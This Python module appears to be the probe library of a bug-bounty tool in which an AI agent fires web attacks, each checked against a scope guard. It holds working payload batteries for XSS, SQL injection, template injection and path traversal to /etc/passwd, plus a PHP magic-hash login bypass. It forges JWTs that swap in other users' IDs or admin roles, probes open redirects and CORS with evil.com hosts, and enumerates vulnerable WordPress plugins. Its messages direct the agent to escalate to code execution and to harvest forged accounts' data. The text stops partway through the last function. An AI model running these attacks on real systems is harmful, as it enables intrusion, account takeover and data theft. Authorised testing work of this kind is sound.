"""Active probe library — safe-by-default checks the agent can fire.

Every probe goes through ScopeGuard; every probe returns (evidence, oracle
verdict) rather than prose. Borrowed shapes: pentest-ai probe registry,
expanded with the manual playbook that matters in bug bounty.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass

import httpx

from avci.core.http import make_client

from ..scope.guard import ScopeGuard
from .oracle import Evidence, Oracle, OracleVerdict

log = logging.getLogger("avci.vulns.probes")

_XSS_PAYLOAD = "avci7xss<script>alert(1)</script>"
# deep-first: .. beyond FS root clamp, so one depth covers every cwd;
# absolute path catches unsanitized file_exists/readfile sinks outright
_TRAVERSAL_PAYLOADS = ("../../../../../etc/passwd", "/etc/passwd",
                       "..\\..\\..\\..\\..\\windows\\win.ini",
                       "....//....//etc/passwd")
# deep traversal clamps at FS root, so one payload works from any cwd depth
_BATTERY_PAYLOAD = "../../../../../etc/passwd"
# OR-semantics file-read markers: passwd (nix), win.ini (windows)
_READ_SIGNATURES = ("root:x:0:0", "[extensions]", "; for 16-bit app support")
# classic file-read/include param names (SecLists burp-parameter-names cut)
_FILE_PARAMS = ("file", "path", "page", "action", "doc", "view", "template",
                "lang", "include", "inc", "module", "cat", "read", "f",
                "dir", "load", "display", "content", "show", "filename",
                "file_name", "document", "folder", "src", "name")


def _param_reacts(baseline: str, body: str, payload: str) -> bool:
    """Did the page CHANGE because the param was set? Mirrored payloads and
    whitespace noise don't count; error phrases and real body deltas do."""
    if not body or body == baseline:
        return False
    stripped = body.replace(payload, "")
    base_s = (baseline or "").strip()
    if stripped.strip() == base_s:
        return False   # only the reflected payload differs — dead param
    low = body.lower()
    if any(h in low for h in ("not exist", "not readable", "no such file",
                              "failed to", "content of", "error",
                              "cannot", "invalid", "missing")):
        return True
    return abs(len(stripped) - len(baseline or "")) > 60
_SQLI_PAYLOADS = ("'\"(", "1' ORDER BY 10--", "1 AND 1=CONVERT(int, 'avci')--")


def _benign_value(field: str) -> str:
    """Plausible non-payload value for a form field, so baseline POSTs and
    co-field values don't trip validation before the payload lands."""
    f = field.lower()
    if "mail" in f:
        return "avci@example.com"
    if any(k in f for k in ("phone", "tel", "id", "qty", "quantity", "num",
                            "age", "zip", "postal", "count", "price")):
        return "1"
    return "avci"
_REDIRECT_MARKER = "https://avci-redirect.evil.com"


@dataclass
class ProbeOutput:
    name: str
    url: str
    verdict: OracleVerdict
    evidence: Evidence
    note: str = ""


class ProbeKit:
    def __init__(self, guard: ScopeGuard, oracle: Oracle | None = None) -> None:
        self.guard = guard
        self.oracle = oracle or Oracle()
        self._client = make_client(timeout=20, follow_redirects=False)

    async def aclose(self) -> None:
        await self._client.aclose()

    # ------------------------------------------------------------------
    async def _get(self, url: str, headers: dict | None = None):
        self.guard.check_url(url)
        return await self._client.get(url, headers=headers or {})

    @staticmethod
    def _req_repr(method: str, url: str, headers: dict | None = None) -> str:
        lines = [f"{method} {url}"]
        for k, v in (headers or {}).items():
            lines.append(f"{k}: {v}")
        return "\n".join(lines)

    # ------------------------------------------------------------------
    async def xss_reflect(self, url: str, param: str) -> ProbeOutput:
        from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
        parts = urlsplit(url)
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        q[param] = _XSS_PAYLOAD
        target = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), ""))
        r = await self._get(target)
        ev = Evidence(request=self._req_repr("GET", target),
                      response_status=r.status_code,
                      response_excerpt=_XSS_PAYLOAD[:60])
        verdict = self.oracle.judge_reflection(_XSS_PAYLOAD, r.text,
                                               context_breakers=True)
        return ProbeOutput("xss_reflect", target, verdict, ev)

    # ------------------------------------------------------------------
    async def _forms_of(self, url: str) -> list[tuple[str, list[str]]]:
        """All forms near a URL: on the page itself, its redirect target,
        or the directory index (handlers like send.php redirect to the
        page carrying their form). Returns [(absolute action, field
        names)] — only in-scope actions, decoy third-party forms (SaaS
        contact widgets) dropped, ≤3 fetches."""
        import re
        from urllib.parse import urljoin, urlsplit
        candidates = [url]
        try:
            r = await self._get(url)
            loc = r.headers.get("location")
            if loc:
                candidates.append(urljoin(url, loc))
        except Exception:  # noqa: BLE001
            pass
        try:
            path = urlsplit(url).path
            if "." in path.rsplit("/", 1)[-1]:
                candidates.append(urljoin(url, "."))
        except Exception:  # noqa: BLE001
            pass
        out: list[tuple[str, list[str]]] = []
        for cand in candidates[:3]:
            try:
                page = await self._get(cand)
            except Exception:  # noqa: BLE001
                continue
            for m in re.finditer(r"<form\b[^>]*>(.*?)</form>", page.text,
                                 re.S | re.I):
                head = m.group(0)[:200]
                ma = re.search(r"<form\b[^>]*?\baction=[\"']([^\"']*)[\"']",
                               head, re.I)
                action = urljoin(cand, ma.group(1)) if ma and ma.group(1) else cand
                try:
                    u = urlsplit(action)
                    if u.scheme not in ("http", "https"):
                        continue
                    if not self.guard.host_allowed(u.netloc.rsplit("@")[-1]
                                                   .split(":")[0].lower()):
                        continue   # third-party decoy form — out of scope
                except Exception:  # noqa: BLE001
                    continue
                fields = re.findall(
                    r"<(?:input|textarea|select|button)\b[^>]*?\bname="
                    r"[\"']([^\"']+)[\"']", m.group(1), re.I)
                fields = list(dict.fromkeys(fields))
                if fields:
                    out.append((action, fields))
            if out:
                break
        return out

    async def _sqli_form_battery(self, url: str,
                                 param: str = "") -> ProbeOutput | None:
        """POST-borne SQLi: forms are where injection actually lives —
        contact/search/filter handlers read $_POST, not $_GET. Discovers
        the form (action + real field names), POSTs the error battery
        into each field with the others held at benign values, judged
        against a benign baseline POST. None = no in-scope form here."""
        forms = await self._forms_of(url)
        if not forms:
            return None
        best: tuple[OracleVerdict, Evidence, str] | None = None
        for action, fields in forms[:2]:
            skip = {"submit", "go", "send", "button", "search", "csrf",
                    "_token", "token", "captcha", "g-recaptcha-response"}
            targets = [f for f in fields if f.lower() not in skip]
            if param:
                targets = [f for f in fields if f == param] or targets
            benign = {f: _benign_value(f) for f in fields}
            self.guard.check_url(action)
            try:
                base = await self._client.post(action, data=benign)
            except Exception:  # noqa: BLE001
                continue
            for f in targets[:6]:
                for payload in _SQLI_PAYLOADS:
                    data = dict(benign)
                    data[f] = str(data.get(f, "")) + payload
                    try:
                        r = await self._client.post(action, data=data)
                    except Exception:  # noqa: BLE001
                        continue
                    v = self.oracle.judge_sqli(
                        base.status_code, len(base.content),
                        r.status_code, len(r.content), body=r.text[:20000])
                    if v.ok:
                        return ProbeOutput(
                            "sqli_error", action, v,
                            Evidence(request=self._req_repr("POST", action) +
                                     f"\n[{f}] = {data[f][:60]}",
                                     response_status=r.status_code,
                                     response_excerpt=r.text[:400]),
                            note=f"form field '{f}' payload={payload}")
                    if best is None or v.verdict == "PENDING":
                        best = (v, Evidence(
                            request=self._req_repr("POST", action) +
                            f"\n[{f}] = {data[f][:60]}",
                            response_status=r.status_code), f)
        if best is None:
            return ProbeOutput(
                "sqli_error", url, OracleVerdict(
                    "SQLi (error-based, form)", "FAILED", [],
                    "form found but no field reacted to the battery"),
                Evidence(request="POST " + url))
        v, ev, f = best
        return ProbeOutput("sqli_error", url, v, ev, note=f"field '{f}'")

    # ------------------------------------------------------------------
    async def _ssti_form_battery(self, url: str,
                                 param: str = "") -> ProbeOutput | None:
        """POST-borne SSTI: profile/register/notes fields are rendered back
        through a template engine far more often than query params are.
        Engine-aware battery — Django ignores {{7*7}} (no math in its
        language), so widthratio + {% debug %} carry the Django half.
        Differential markers: the engine's evaluated output must appear in
        the payload response and NOT in the benign baseline."""
        forms = await self._forms_of(url)
        if not forms:
            return None
        battery = (
            ("{{7*7}}", ("49",)),                # Jinja/Twig/Java-ish
            ("{{7*'7'}}", ("7777777",)),         # Jinja2 string-repeat
            ("${7*7}", ("49",)),                 # Freemarker/Velocity/ES
            ("<%= 7*7 %>", ("49",)),             # ERB/EJS
            ("#{7*7}", ("49",)),                 # Ruby/Thymeleaf
            ("{% widthratio 7 1 7 %}", ("49",)), # Django math
            ("{% debug %}", ("django.conf", "SETTINGS", "DEBUG")),
            ("{% print 7*7 %}", ("49",)),        # Jinja statement-tag —
                                                 # survives {{ }} filters
            ("{% if 7*7 == 49 %}avciyes{% endif %}", ("avciyes",)),
            ("{{ 'avci'|upper }}", ("AVCI",)),
            ("{{ settings }}", ("SECRET_KEY",)),
            ("{{ ''.__class__ }}", ("<class 'str'>",)),
            ("%{7*7}", ("49",)),                  # OGNL / Struts2 %{expr}
            ("%{'avci'.toUpperCase()}", ("AVCI",)),
        )
        for action, fields in forms[:2]:
            skip = {"submit", "go", "send", "button", "search", "csrf",
                    "_token", "token", "captcha", "g-recaptcha-response",
                    "password2", "confirmation"}
            targets = [f for f in fields if f.lower() not in skip]
            if param:
                targets = [f for f in fields if f == param] or targets
            benign = {f: _benign_value(f) for f in fields}
            self.guard.check_url(action)
            try:
                base = await self._client.post(action, data=benign)
            except Exception:  # noqa: BLE001
                continue
            for f in targets[:6]:
                for payload, markers in battery:
                    data = dict(benign)
                    data[f] = str(data.get(f, "")) + payload
                    try:
                        r = await self._client.post(action, data=data)
                    except Exception:  # noqa: BLE001
                        continue
                    grew = len(r.content) - len(base.content)
                    hit = any(m in r.text and m not in base.text
                              for m in markers)
                    if not hit and payload == "{% debug %}" and grew > 800:
                        hit = True  # Django debug dump is huge
                    render_host = r  # stored SSTI: the payload may render on
                    if not hit:     # a LATER page of the flow, not the POST
                        try:        # response — re-GET the source page
                            render_host = await self._get(url)
                            grew2 = len(render_host.content) - len(base.content)
                            hit = any(m in render_host.text and
                                      m not in base.text for m in markers)
                            if not hit and payload == "{% debug %}" and \
                                    grew2 > 800:
                                hit = True
                        except Exception:  # noqa: BLE001
                            pass
                    if hit:
                        v = OracleVerdict(
                            "SSTI (form)", "CONFIRMED",
                            [{"check": "expression evaluated in response",
                              "pass": True}],
                            f"{payload!r} evaluated — engine renders this "
                            f"field; escalate to engine RCE/debug payloads")
                        return ProbeOutput(
                            "ssti", action, v,
                            Evidence(request=self._req_repr("POST", action) +
                                     f"\n[{f}] = {data[f][:60]}",
                                     response_status=r.status_code,
                                     response_excerpt=r.text[:800]),
                            note=f"form field '{f}' payload={payload}")
        return ProbeOutput(
            "ssti", url, OracleVerdict(
                "SSTI (form)", "FAILED", [],
                "form battery exhausted — no template evaluation"),
            Evidence(request="POST " + url))

    # ------------------------------------------------------------------
    # PHP magic-hash bypass: md5/sha1 input compared with loose == against a
    # 0e<digits> digest — PHP casts every "0e"+"digits" string to 0, so ANY
    # known 0e preimage beats ANY other. The wrong-password page echoing your
    # input's hash is the oracle that the check is hash-based at all.
    _MAGIC_HASHES = (
        ("QNKCD7", "md5"), ("240610708", "md5"), ("s878626493s", "md5"),
        ("s1091221200a", "md5"), ("s1836677006a", "md5"),
        ("s214587387a", "md5"),
        ("aaroZmOk", "sha1"), ("aaK1STfY", "sha1"), ("aaO8zKZF", "sha1"),
        ("aa3OFF9m", "sha1"),
    )
    _WRONG_MARKERS = ("incorrect", "wrong", "invalid", "failed", "error",
                      "denied", "try again", "nope", "bad password")

    async def _magic_hash_battery(self, url: str) -> ProbeOutput | None:
        forms = await self._forms_of(url)
        if not forms:
            return None
        for action, fields in forms[:2]:
            pwd = [f for f in fields if any(w in f.lower() for w in
                    ("pass", "pwd", "secret", "key", "pin", "code"))]
            targets = pwd or [f for f in fields if f.lower() not in
                              ("submit", "go", "send", "button", "csrf",
                               "_token", "token", "captcha", "username",
                               "user", "email", "name")]
            if not targets:
                continue
            benign = {f: _benign_value(f) for f in fields}
            self.guard.check_url(action)
            try:
                base = await self._client.post(action, data=benign)
            except Exception:  # noqa: BLE001
                continue
            base_fail = any(w in base.text.lower()
                            for w in self._WRONG_MARKERS) or \
                base.status_code in (401, 403)
            for f in targets[:3]:
                for pre, algo in self._MAGIC_HASHES:
                    data = dict(benign)
                    data[f] = pre
                    try:
                        r = await self._client.post(action, data=data)
                    except Exception:  # noqa: BLE001
                        continue
                    clean = not any(w in r.text.lower()
                                    for w in self._WRONG_MARKERS) and \
                        r.status_code not in (401, 403)
                    if r.text != base.text and clean and base_fail:
                        v = OracleVerdict(
                            "Auth bypass (magic hash)", "CONFIRMED",
                            [{"check": f"{algo} 0e preimage accepted",
                              "pass": True}],
                            f"{pre!r} ({algo} → 0e… digits) accepted where a "
                            "wrong password fails — PHP loose == casts every "
                            "0e<digits> digest to 0; the vault opens")
                        return ProbeOutput(
                            "magic_hash", action, v,
                            Evidence(request=self._req_repr("POST", action) +
                                     f"\n[{f}] = {pre}",
                                     response_status=r.status_code,
                                     response_excerpt=r.text[:800]),
                            note=f"field '{f}' preimage={pre} ({algo})")
        return ProbeOutput(
            "magic_hash", url, OracleVerdict(
                "Auth bypass (magic hash)", "FAILED", [],
                "no 0e preimage accepted (hash compare is strict === or "
                "target digest is not 0e-shaped)"),
            Evidence(request="POST " + url))

    # ------------------------------------------------------------------
    async def sqli_error(self, url: str, param: str = "") -> ProbeOutput:
        from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
        parts = urlsplit(url)
        # a paramless URL or a bare handler (no query) is form territory —
        # $_POST is where contact/search/filter forms actually inject
        if not param or not parts.query:
            out = await self._sqli_form_battery(url, param)
            if out is not None:
                return out
            if not param:
                return ProbeOutput("sqli_error", url, OracleVerdict(
                    "SQLi (error-based)", "FAILED", [],
                    "no form found behind this URL — name a query param "
                    "or pass the page that carries the form"),
                    Evidence(request="GET " + url))
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        base = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), ""))
        r0 = await self._get(base)
        best: OracleVerdict | None = None
        best_ev: Evidence | None = None
        best_target = base
        for payload in _SQLI_PAYLOADS:
            q2 = dict(q)
            q2[param] = (q2.get(param) or "1") + payload
            t = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q2), ""))
            r = await self._get(t)
            v = self.oracle.judge_sqli(
                r0.status_code, len(r0.content), r.status_code, len(r.content),
                body=r.text[:20000],
            )
            if v.ok or (best and best.verdict == "CONFIRMED"):
                best, best_ev, best_target = v, Evidence(
                    request=self._req_repr("GET", t),
                    response_status=r.status_code,
                    response_excerpt=r.text[:400],
                ), t
                if v.ok:
                    break
            elif best is None or v.verdict == "PENDING":
                best, best_ev, best_target = v, Evidence(
                    request=self._req_repr("GET", t), response_status=r.status_code), t
        assert best is not None
        return ProbeOutput("sqli_error", best_target, best,
                           best_ev or Evidence(request="GET " + best_target))

    # ------------------------------------------------------------------
    async def open_redirect(self, url: str, param: str) -> ProbeOutput:
        from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
        parts = urlsplit(url)
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        q[param] = _REDIRECT_MARKER
        target = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), ""))
        r = await self._get(target)
        loc = r.headers.get("location", "")
        ev = Evidence(request=self._req_repr("GET", target),
                      response_status=r.status_code, response_excerpt=loc)
        verdict = self.oracle.judge_redirect(target, loc)
        return ProbeOutput("open_redirect", target, verdict, ev)

    # ------------------------------------------------------------------
    async def cors_reflect(self, url: str) -> ProbeOutput:
        evil = "https://avci.evil.com"
        r = await self._get(url, headers={"Origin": evil})
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "")
        verdict = self.oracle.judge_cors(evil, acao)
        if verdict.ok and acac.lower() == "true":
            verdict.reason += " + credentials=true (high impact)"
        ev = Evidence(request=self._req_repr("GET", url, {"Origin": evil}),
                      response_status=r.status_code,
                      response_excerpt=f"ACAO={acao} ACAC={acac}")
        return ProbeOutput("cors_reflect", url, verdict, ev)

    # ------------------------------------------------------------------
    async def traversal(self, base_url: str, param: str = "") -> ProbeOutput:
        """Path/file-read probe. With an explicit param it runs the classic
        payload battery against it. Without one it becomes a param-miner:
        a battery of classic file-read param names, each hit with one
        canonical deep traversal payload — file signatures CONFIRM, and a
        response that merely REACTS to the param (error text / body delta
        vs the param-less baseline) is surfaced as a PENDING live param,
        because apps rarely advertise their read params in any form."""
        from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
        parts = urlsplit(base_url)
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        if param:
            return await self._traversal_named(
                base_url, parts, q, param, _TRAVERSAL_PAYLOADS)

        # ---- param-miner mode ------------------------------------------------
        try:
            baseline = (await self._get(base_url)).text
        except Exception:  # noqa: BLE001
            baseline = ""
        live: list[str] = []
        for cand in _FILE_PARAMS:
            if cand in q:
                continue   # already present in the URL — nothing new to learn
            q2 = dict(q)
            q2[cand] = _BATTERY_PAYLOAD
            t = urlunsplit((parts.scheme, parts.netloc, parts.path,
                            urlencode(q2), ""))
            try:
                r = await self._get(t)
            except Exception:  # noqa: BLE001
                continue
            v = self.oracle.judge_any(
                "Path traversal", _READ_SIGNATURES, r.text)
            if v.ok:
                return ProbeOutput(
                    "traversal", t, v,
                    Evidence(request=self._req_repr("GET", t),
                             response_status=r.status_code,
                             response_excerpt=r.text[:400]),
                    note=f"param={cand} payload={_BATTERY_PAYLOAD}",
                )
            body = r.text or ""
            if _param_reacts(baseline, body, _BATTERY_PAYLOAD):
                live.append(f"{cand} ({len(body) - len(baseline):+d}b)")
        if live:
            pend = OracleVerdict(
                claim="Path traversal (param discovery)",
                verdict="PENDING",
                reason=("live file-params react differentially vs baseline: "
                        + ", ".join(live)
                        + " — aim read payloads at these names"),
            )
            return ProbeOutput(
                "traversal", base_url, pend,
                Evidence(request=self._req_repr("GET", base_url),
                         response_excerpt="baseline vs param'd responses differ"),
                note="live params: " + ", ".join(p.split(" ")[0] for p in live))
        failed = OracleVerdict(claim="Path traversal", verdict="FAILED",
                               reason="no file signatures and no reacting "
                                      "params across the file-param battery")
        return ProbeOutput("traversal", base_url, failed, Evidence())

    async def _traversal_named(self, base_url, parts, q, param, payloads):
        from urllib.parse import urlencode, urlunsplit
        for payload in payloads:
            q2 = dict(q)
            q2[param] = payload
            t = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q2), ""))
            try:
                r = await self._get(t)
            except Exception:  # noqa: BLE001
                continue
            v = self.oracle.judge_any(
                "Path traversal", _READ_SIGNATURES, r.text
            )
            if v.ok:
                return ProbeOutput(
                    "traversal", t, v,
                    Evidence(request=self._req_repr("GET", t),
                             response_status=r.status_code,
                             response_excerpt=r.text[:300]),
                    note=payload,
                )
        failed = OracleVerdict(claim="Path traversal", verdict="FAILED",
                               reason="no file signatures in any payload response")
        return ProbeOutput("traversal", base_url, failed, Evidence())

    # ------------------------------------------------------------------
    async def header_audit(self, url: str) -> ProbeOutput:
        r = await self._get(url)
        missing: list[str] = []
        h = {k.lower() for k in r.headers}
        for want, nice in (
            ("strict-transport-security", "HSTS"),
            ("content-security-policy", "CSP"),
            ("x-content-type-options", "X-Content-Type-Options"),
            ("x-frame-options", "XFO"),
        ):
            if want not in h:
                missing.append(nice)
        verdict = self.oracle.judge_generic(
            "Missing security headers", missing if missing else ["none-missing"],
            " ".join(missing) or "none-missing",
        )
        verdict.verdict = "CONFIRMED" if missing else "FAILED"
        ev = Evidence(request=self._req_repr("GET", url),
                      response_status=r.status_code,
                      response_excerpt=f"missing={missing}")
        return ProbeOutput("header_audit", url, verdict, ev)

    # ------------------------------------------------------------------
    async def jwt_probe(self, url: str, token: str) -> ProbeOutput:
        import base64
        import json as _json
        try:
            h_b64, p_b64, _sig = token.split(".")
            pad = lambda s: s + "=" * (-len(s) % 4)  # noqa: E731
            header = _json.loads(base64.urlsafe_b64decode(pad(h_b64)))
            claims = _json.loads(base64.urlsafe_b64decode(pad(p_b64)))
        except Exception as exc:  # noqa: BLE001
            failed = OracleVerdict("JWT decode", "FAILED", [], f"unparseable: {exc}")
            return ProbeOutput("jwt_probe", url, failed, Evidence())
        flags: list[str] = []
        if header.get("alg") in ("none", ""):
            flags.append("alg=none")
        if claims.get("alg") == "none":
            flags.append("claims alg none")
        verdict = self.oracle.judge_generic("JWT weakness", flags or ["no-flags"],
                                            " ".join(flags) or "no-flags")
        verdict.verdict = "CONFIRMED" if flags else "FAILED"
        ev = Evidence(request=f"token={token[:120]}...",
                      response_excerpt=_json.dumps(header) + _json.dumps(claims)[:400])
        return ProbeOutput("jwt_probe", url, verdict, ev)

    # ------------------------------------------------------------------
    async def jwt_tamper(self, url: str, token: str,
                         cookie_name: str = "auth_token") -> ProbeOutput:
        """Claims-swap battery: re-sign the token with a junk key (and as
        alg=none), flip identity/role claims, replay, and diff against the
        original-token baseline. Apps that decode with verify_signature:False
        accept the forged token and render the forged identity — that body
        delta is the finding. Numeric identity claims also get a neighbor-id
        sweep (other users' ids cluster near yours)."""
        import base64
        import hmac
        import hashlib
        import json as _json
        try:
            h_b64, p_b64, _sig = token.split(".")
            pad = lambda s: s + "=" * (-len(s) % 4)  # noqa: E731
            header = _json.loads(base64.urlsafe_b64decode(pad(h_b64)))
            claims = _json.loads(base64.urlsafe_b64decode(pad(p_b64)))
        except Exception as exc:  # noqa: BLE001
            failed = OracleVerdict("JWT tamper", "FAILED", [], f"unparseable: {exc}")
            return ProbeOutput("jwt_tamper", url, failed, Evidence())

        def b64(raw: bytes) -> str:
            return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

        def junk_sign(h: dict, p: dict) -> str:
            body = f"{b64(_json.dumps(h, separators=(',', ':')).encode())}." \
                   f"{b64(_json.dumps(p, separators=(',', ':')).encode())}"
            sig = hmac.new(b"avci-junk-key", body.encode(), hashlib.sha256).digest()
            return f"{body}.{b64(sig)}"

        def none_sign(h: dict, p: dict) -> str:
            body = f"{b64(_json.dumps({'alg': 'none', 'typ': 'JWT'}).encode())}." \
                   f"{b64(_json.dumps(p, separators=(',', ':')).encode())}"
            return f"{body}."

        # NB: httpx request-level cookies= do NOT override a same-name cookie
        # sitting in the client jar (the jar wins) — so cookie overrides are
        # sent as an explicit Cookie header built from the jar with our name
        # replaced. Session/CSRF cookies from the jar survive alongside.
        def _cookie_hdr(value: str) -> str:
            jar = {c.name: c.value for c in self._client.cookies.jar}
            jar[cookie_name] = value
            return "; ".join(f"{k}={v}" for k, v in jar.items())

        # baseline with the ORIGINAL token (identity page, e.g. dashboard)
        base = await self._client.get(url, headers={"Cookie": _cookie_hdr(token)})
        base_body = base.text

        # battery: (label, forged-token)
        battery: list[tuple[str, str]] = []
        battery.append(("junk-sign control (sig unverified?)",
                        junk_sign(dict(header, alg="HS256"), claims)))
        battery.append(("alg=none control",
                        none_sign(dict(header), claims)))
        id_claims = [k for k in ("user_id", "uid", "sub", "id", "userId")
                     if k in claims]
        for k in id_claims:
            val = claims[k]
            # numeric ids arrive both as ints and digit-STRINGS ('10018') —
            # both get the neighbor sweep (flag/seeded accounts sit in the
            # unexplained holes of the id span)
            as_int = val if isinstance(val, int) else (
                int(val) if isinstance(val, str) and val.isdigit() else None)
            if as_int is not None:
                for d in (-20, -13, -10, -5, -3, -2, -1, 1, 2, 3, 5,
                          10, 13, 20):
                    battery.append((f"{k} {val}->{as_int + d}",
                                    junk_sign(dict(header, alg="HS256"),
                                              dict(claims,
                                                   **{k: as_int + d}))))
            battery.append((f"{k} {val!r}->'admin'",
                            junk_sign(dict(header, alg="HS256"),
                                      dict(claims, **{k: "admin"}))))
        for k in ("role", "user_type", "isAdmin", "admin", "roles", "scope"):
            if k in claims and claims[k] not in ("admin", ["admin"], "administrator"):
                battery.append((f"{k} -> admin",
                                junk_sign(dict(header, alg="HS256"),
                                          dict(claims, **{k: "admin"}))))

        notes: list[str] = []
        best: tuple[str, str] | None = None
        for label, forged in battery:
            try:
                r = await self._client.get(
                    url, headers={"Cookie": _cookie_hdr(forged)})
            except Exception:  # noqa: BLE001 — transport hiccup: skip variant
                continue
            if r.status_code == base.status_code and r.text and r.text != base_body:
                notes.append(f"ACCEPTED {label} (body changed, status same)")
                if best is None:
                    best = (label, forged)
            elif r.status_code != base.status_code and r.status_code != 401:
                notes.append(f"status-shift {label}: {base.status_code}->{r.status_code}")
        if best:
            verdict = OracleVerdict(
                "JWT tamper", "CONFIRMED",
                [{"check": "forged token accepted",
                  "detail": best[0]}],
                f"server rendered a DIFFERENT identity for a token we forged "
                f"ourselves ({best[0]}) — the signature is not verified; "
                f"identity claims are writable. Re-read the page with the "
                f"winning token and harvest the forged account's data.")
            ev = Evidence(request=f"GET {url} cookie {cookie_name}=<forged>",
                          response_status=base.status_code,
                          response_excerpt="; ".join(notes)[:500])
            return ProbeOutput("jwt_tamper", url, verdict, ev)
        failed = OracleVerdict(
            "JWT tamper", "FAILED", [],
            "no claim-swap variant changed the response — signature is "
            "verified (or identity claims are not trusted); junk-secret "
            "forgery not accepted")
        ev = Evidence(request=f"GET {url} cookie {cookie_name}=<original>",
                      response_status=base.status_code,
                      response_excerpt="; ".join(notes)[:300] or "all variants 401/identical")
        return ProbeOutput("jwt_tamper", url, failed, ev)

    # ------------------------------------------------------------------
    # popular + historically-vulnerable plugin slugs (wpscan-style probing;
    # readme.txt is the fingerprint). Backup/migration/file/db-manager
    # families first — they carry the worst unauth-RCE history.
    _WP_SLUGS = (
        "backup-backup", "all-in-one-wp-migration", "duplicator", "updraftplus",
        "backwpup", "wp-dbmanager", "wp-file-manager", "file-manager",
        "download-monitor", "wp-downloadmanager", "wp-media-folder",
        "filebird", "ajax-file-manager", "file-manager-advanced",
        "wp-statistics", "wp-super-cache", "w3-total-cache", "wp-fastest-cache",
        "litespeed-cache", "autoptimize", "async-javascript", "wp-rocket",
        "really-simple-ssl", "ssl-zen", "force-really-simple-ssl",
        "loginizer", "limit-login-attempts-reloaded", "all-in-one-security",
        "wordfence", "sucuri-scanner", "wp-simple-firewall", "ithemes-security",
        "contact-form-7", "wpforms-lite", "ninja-forms", "caldera-forms",
        "formidable", "form-maker", "everest-forms", "wpforms", "gravityforms",
        "akismet", "antispam-bee", "wp-spamshield",
        "wordpress-seo", "seo-by-rank-math", "all-in-one-seo-pack", "aioseo",
        "google-site-kit", "google-analytics-for-wordpress", "ga-google-analytics",
        "elementor", "elementor-pro", "beaver-builder-lite", "divi-builder",
        "brizy", "siteorigin-panels", "wp-bakery", "js_composer",
        "woocommerce", "easy-digital-downloads", "wp-ecommerce", "ecwid",
        "jetpack", "classic-editor", "tinymce-advanced", "disable-comments",
        "redirection", "pretty-link", "affiliate-wp", "simple-301-redirects",
        "wp-mail-smtp", "wp-email-smtp", "easy-wp-smtp", "post-smtp",
        "gmail-smtp", "wp-html-mail",
        "modern-events-calendar-lite", "events-manager", "the-events-calendar",
        "wp-fullcalendar", "booking", "wp-booking-system", "ameliabooking",
        "learnpress", "lifterlms", "tutor", "sensei-lms", "wp-courses",
        "membership-2", "memberpress", "restrict-content-pro", "s2member",
        "paid-memberships-pro", "ultimate-member", "profile-builder",
        "users-wp", "wp-user-manager",
        "adminer", "wpdbmanager", "wp-phpmyadmin", "sql-executioner",
        "wp-optimize", "wp-sweep", "advanced-custom-fields", "acf",
        "pods", "toolset-types", "metabox", "cpt-ui", "custom-post-type-ui",
        "wp-all-import", "wp-all-export", "import-export-wordpress-users",
        "widget-importer-exporter", "customizer-export-import",
        "insert-headers-and-footers", "ad-inserter", "header-footer-code-manager",
        "wp-google-maps", "wp-google-map-plugin", "mapsvg", "agile-store-locator",
        "slider-revolution", "revslider", "layer-slider", "smart-slider-3",
        "meta-slider", "soliloquy", "envira-gallery", "nextgen-gallery",
        "foogallery", "photo-gallery", "gallery-images", "huge-it-gallery",
    )

    # ------------------------------------------------------------------
    async def wp_plugins(self, url: str) -> ProbeOutput:
        """WordPress plugin inventory: harvest plugin directory names from
        open directory listings and page-source references, then fingerprint
        each plugin via its readme.txt (Stable tag = version). Versioned
        plugin inventories are the raw material for known-CVE matching —
        backup/migration/file/db-manager families carry unauth-RCE history."""
        import re as _re
        base = url.split("://", 1)[0] + "://" + url.split("://", 1)[1].split("/", 1)[0]
        names: set[str] = set()
        listing_urls = [f"{base}/wp-content/plugins/"]
        for lu in listing_urls:
            try:
                r = await self._client.get(lu)
            except Exception:  # noqa: BLE001
                continue
            for m in _re.finditer(r"href=[\"']([A-Za-z0-9_.-]+)/?[\"']", r.text):
                n = m.group(1)
                if n not in ("..", ".", "index.php") and not n.endswith(".php"):
                    names.add(n)
        try:
            home = await self._client.get(base + "/")
            for m in _re.finditer(r"wp-content/plugins/([A-Za-z0-9_.-]+)/",
                                  home.text):
                names.add(m.group(1))
        except Exception:  # noqa: BLE001
            pass
        # closed listings hide inactive plugins entirely — probe a curated
        # slug list (popular + historically-vulnerable families) the way
        # wpscan does; readme.txt presence is the fingerprint.
        names.update(self._WP_SLUGS)
        inventory: list[str] = []
        for n in sorted(names)[:25]:
            try:
                r = await self._client.get(
                    f"{base}/wp-content/plugins/{n}/readme.txt")
            except Exception:  # noqa: BLE001
                continue
            if r.status_code != 200:
                continue
            title = ""
            mt = _re.search(r"===\s*(.+?)\s*===", r.text)
            if mt:
                title = mt.group(1)
            ver = ""
            mv = _re.search(r"Stable tag:\s*([0-9][0-9A-Za-z.-]*)", r.text)
            if mv:
                ver = mv.group(1)
            if title or ver:
                inventory.append(f"{n} v{ver or '?'} ({title})")
        if not inventory:
            failed = OracleVerdict(
                "wp_plugins", "FAILED", [],
                "no plugin readme fingerprints (listing closed and no "
                "page-source references)")
            return ProbeOutput("wp_plugins", url, failed, Evidence())
        risky = [i for i in inventory if _re.search(
            r"(?i)backup|migrat|file.?manager|download|db|database|"
            r"import|export| duplicat", i)]
        verdict = OracleVerdict(
            "wp_plugins", "CONFIRMED",
            [{"check": "versioned plugin inventory", "detail": i}
             for i in inventory],
            f"{len(inventory)} fingerprinted plugins. Match each name+version "
            f"against known CVEs (unauth RCE/file-write families: backup, "
            f"migration, file-manager, db-manager). "
            + (f"HIGH-VALUE leads: {risky}" if risky else ""))
